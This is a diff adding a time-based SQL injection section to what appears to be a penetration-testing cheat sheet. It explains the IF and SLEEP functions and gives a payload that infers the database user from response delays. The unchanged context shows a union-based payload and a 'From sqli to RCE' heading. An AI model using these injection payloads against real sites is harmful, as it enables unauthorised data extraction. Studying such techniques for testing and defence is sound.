@@ -109,6 +109,23 @@ Example
 union select 1, concat(database(), version(), user()) 3 -- - 
 ```
 
+## Time-based sqli
+### SQL IF statement 
+```sql 
+IF(condition, value_if_true, value_if_false) 
+```
+### MySQL sleep instruction 
+```sql 
+SLEEP(arg)
+```
+With this instruction the response of the query will be send only after arg seconds. 
+
+Combining these instructions in SQLi, it is possible to sleep the website response on request addressing to the database. 
+So with this the attacker could perform a time based guessing. 
+```sql 
+SELECT * FROM products WHERE id=1; IF (SYSTEM_USER='sa', SLEEP(4), NULL)
+```
+
 
 ## From sqli to RCE 
 MySQL provides these functions : 
